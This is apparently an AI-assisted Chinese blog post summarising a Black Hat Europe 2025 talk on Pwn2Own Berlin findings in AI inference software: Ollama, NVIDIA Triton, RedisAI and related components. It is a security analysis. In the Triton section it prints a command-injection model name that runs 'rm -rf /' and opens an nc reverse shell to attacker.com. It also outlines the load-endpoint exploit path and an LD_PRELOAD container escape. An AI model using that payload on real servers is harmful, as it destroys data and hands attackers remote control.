---
title: "【讲座学习】攻破 AI 推理系统：来自 Pwn2Own Berlin 2025 的教训"
published: 2026-09-10
description: Fuzzinglabs 团队将 AI 基础设施首次带进 Pwn2Own 官方赛事：Ollama GGUF 解析器堆溢出、Triton Python 后端命令注入、RedisAI LUA 沙箱逃逸——AI 安全的本质是软件工程成熟度问题，而非算法或模型本身的问题。
tags: [人工智能, 网络安全, 漏洞分析]
category: 讲座学习
series: "讲座学习"
seriesOrder: 1
---

Black Hat Europe 2025 演讲《Breaking AI Inference Systems: Lessons From Pwn2Own Berlin》（攻破 AI 推理系统：来自 Pwn2Own 柏林的教训），视频地址：

- B 站：[【黑帽欧洲 2025】攻破AI推理系统：来自Pwn2Own柏林的教训](https://www.bilibili.com/video/BV1xmg36KEAD)
- YouTube：[Breaking AI Inference Systems: Lessons From Pwn2Own Berlin](https://www.youtube.com/watch?v=Qy1Uu5Wdkg8)

> 备注：本文 AI 辅助生成。

## 一、报告摘要

本次演讲系统回顾了 Fuzzinglabs 团队在 **Pwn2Own Berlin 2025** 中针对人工智能推理系统开展的安全研究实践。该研究标志着 **AI 基础设施首次作为官方竞赛类别** 正式纳入全球顶级漏洞挖掘赛事体系。

研究聚焦两大核心目标：

1. **Ollama**：本地大语言模型运行时；
2. **NVIDIA Triton Inference Server**：企业级 AI 推理服务框架。

同时延伸评估以下主流 AI 相关开源组件：

- ChromaDB
- RedisAI
- PostgreSQL pgvector
- NVIDIA Container Toolkit

研究方法严格遵循结构化安全工程流程，涵盖：

- 威胁建模
- 文件格式模糊测试（Fuzzing）
- 插件机制逆向分析
- 配置解析链路审计

靶标遴选的首要准则为 **"攻击面可触达性"**，具体包括：

- 是否支持本地快速部署；
- 是否存在未受控的文件解析逻辑，如 GGUF 模型格式解析器；
- 是否暴露 HTTP/gRPC 远程接口；
- 是否采用混合语言栈，如 Go/C++/Python，从而引入内存安全风险。

该策略最终导向对 Ollama 中 GGUF 解析器与 Triton 中模型配置管道的深度挖掘，并在 Triton 的 Python 后端发现关键命令注入漏洞。

核心判断是：**AI 基础设施并非"新型攻击面"，而是传统软件安全缺陷在新场景下的集中映射。** 其脆弱性根源在于工程成熟度不足、安全开发生命周期缺位，以及对底层依赖组件尤其是 C/C++ 解析器的风险认知缺失。

## 二、核心要点

- **赛事意义**：AI 基础设施首次成为 Pwn2Own 官方竞赛类别。
- **核心目标**：Ollama、NVIDIA Triton Inference Server。
- **延伸目标**：ChromaDB、RedisAI、PostgreSQL pgvector、NVIDIA Container Toolkit。
- **研究方法**：威胁建模、Fuzzing、插件逆向、配置解析链路审计。
- **遴选逻辑**：优先选择可本地部署、具备文件解析入口、暴露远程接口、采用混合语言栈的目标。
- **关键突破**：Triton Python 后端存在命令注入漏洞。
- **本质结论**：AI 安全问题的根源是软件工程成熟度问题，而非算法或模型本身的问题。

## 三、关键结论

### 结论 1：AI 推理系统整体安全水位极低，已进入高危暴露阶段

- Pwn2Own Berlin 2025 数据显示，AI 类别参赛成功率高达 **80%**，远超传统桌面/移动平台赛事平均水平。
- NVIDIA Triton 单个组件即引发 **10 起有效提交**，碰撞率异常突出，说明其可能存在系统性设计缺陷。

### 结论 2：漏洞分布呈现显著结构性特征，RCE 集中于"配置即代码"环节

远程代码执行能力高度集中于"配置即代码"环节，例如：

- Triton 模型名称字段的命令注入；
- Ollama 注册中心响应处理中的 Gzip 炸弹 DoS；
- RedisAI 沙箱内 LUA 脚本的 Use-After-Free 逃逸。

这些漏洞均源于将用户可控输入未经净化直接嵌入执行上下文。

### 结论 3：语言安全性不等于系统安全性

- Ollama 主体采用内存安全的 Go 语言开发，但其 GGUF 解析器重度依赖 C++ 后端；
- Triton 虽以 C++ 为主，却通过 Python 绑定层桥接外部模块，导致 FFI 成为关键薄弱点；
- Rust/Go 仅能缓解内存破坏类漏洞，无法规避逻辑缺陷、序列化/反序列化漏洞、权限控制失效等更高层风险。

### 结论 4：厂商响应机制存在严重滞后性与透明度危机

- Ollama 团队对 Hunter 平台提交的多个高危漏洞，如 Token 窃取、认证绕过，长期未响应，迫使研究人员转向 GitHub 公开披露；
- NVIDIA 安全团队在赛事前紧急投入 4 名工程师进行"防御性审计"，虽发现 22 个 CVE，却未同步发布补丁或安全通告，形成事实上的"漏洞囤积"，加剧供应链风险。

### 结论 5：AI 安全已从单点防护升级为全栈对抗

攻击者可沿以下路径实现纵深渗透：

**向量数据库 → 推理服务器 → 容器运行时**

具体表现为：

- RedisAI 沙箱逃逸可获取宿主机初始访问权限；
- Triton RCE 可接管 AI 服务集群；
- NVIDIA Container Toolkit 容器逃逸可完成最终提权。

因此，防御体系必须覆盖：

1. 数据层：向量索引；
2. 计算层：模型推理；
3. 基础设施层：GPU 容器。

## 四、重要细节

### （一）Ollama 安全研究

审计周期：**2024 年 10 月至 2025 年 2 月**。

累计发现 **7 类漏洞**，包括：

1. **CVE-2025-XXXXX：Gzip 炸弹拒绝服务**
	- 根因：Go 标准库 `io.ReadAll` 未校验响应体大小；
	- 场景：恶意镜像仓库响应导致 Gzip 炸弹 DoS。
2. **Token 窃取漏洞**
	- HTTP 重定向时 Authorization 头未正确转发；
	- 导致 OAuth 令牌泄露。
3. **堆溢出漏洞**
	- 经模糊测试发现；
	- Go 前端接收超长 GGUF 元数据后，未经长度校验传递至 C++ 推理引擎；
	- 触发固定尺寸结构体拷贝越界；
	- 本可达成 RCE，但在 Pwn2Own 开赛前两周被一次包含 **200–300 次提交** 的巨型 PR 彻底修复；
	- 凸显赛事规则对"最新稳定版"的强制要求带来的研究不确定性。

### （二）NVIDIA Triton Inference Server 安全研究

Triton 采用多后端架构，支持：

- PyTorch
- TensorRT
- Python
- 等其他异构计算后端

各后端配置逻辑独立实现。

研究发现其 Python 后端在加载模型时，将 JSON 配置中的 `model_name` 字段直接拼接进 Shell 命令，例如：

```bash
mkdir -p /models/{model_name}
```

未做任何 Shell 元字符过滤。

攻击者可构造恶意模型名：

```bash
test; rm -rf /; nc -e /bin/sh attacker.com 4444
```

即可在服务端执行任意命令并建立反向 Shell。

利用链极简：

- 发送一个 HTTP POST 请求至 `/v2/repository/models/load`；
- 携带特制 JSON 载荷；
- 5 秒内即可获得完整远程控制权。

### （三）RedisAI 安全研究

Wiz 团队发现 **"Redis Shell"漏洞**。

漏洞机制：

- 利用 LUA 沙箱内的 Use-After-Free 原语；
- 通过精心构造的 LUA 脚本触发内存重用；
- 继而劫持沙箱进程控制流；
- 最终突破隔离边界。

### （四）其他组件风险

#### 1. ChromaDB

- Python/Rust 混合实现；
- Rust 部分虽保障内存安全；
- 但 Python 绑定层存在序列化/反序列化逻辑缺陷。

#### 2. PostgreSQL pgvector

- 向量距离计算函数未设执行时间上限；
- 可能被用于资源耗尽型 DoS 攻击。

#### 3. NVIDIA Container Toolkit

- 存在容器逃逸漏洞；
- 暴露 GPU 虚拟化层与 Linux 内核驱动交互中的权限提升路径；
- 原文所述 PoC 仅需三步：
	- 上传篡改后的 Docker 容器配置文件；
	- 利用 `LD_PRELOAD` 劫持动态链接器钩子函数；
	- 绕过 NVIDIA Container Toolkit 的 GPU 设备访问控制机制；
	- 实现从容器到宿主机的完整渗透。

## 五、攻击路径与纵深风险

### 攻击链示意

**向量数据库 → 推理服务器 → 容器运行时**

1. **数据层**：向量数据库与索引组件可能存在序列化、DoS、逻辑缺陷风险；
2. **计算层**：推理服务器可能因配置注入、模型解析、FFI 桥接等问题被 RCE；
3. **基础设施层**：GPU 容器运行时可能因权限控制缺陷导致容器逃逸与宿主机提权。

### 防御要求

防御体系必须覆盖：

- 数据层：向量索引；
- 计算层：模型推理；
- 基础设施层：GPU 容器。

## 六、总体结论

所有这些细节共同指向一个根本性结论：

**AI 安全的本质是软件工程成熟度问题，而非算法或模型特有问题。**

当行业仍在追逐参数规模与推理速度时，AI 基础架构的安全根基已出现大规模失守。AI 基础设施并不是全新的攻击面，而是传统软件安全缺陷——如命令注入、堆溢出、认证绕过——在新场景下的集中映射。

因此，AI 安全治理不能仅停留在模型对齐、内容安全或算法层面，而必须回到软件安全工程本身：威胁建模、安全开发生命周期、依赖组件治理、配置解析审计、FFI 边界防护以及厂商漏洞响应机制。
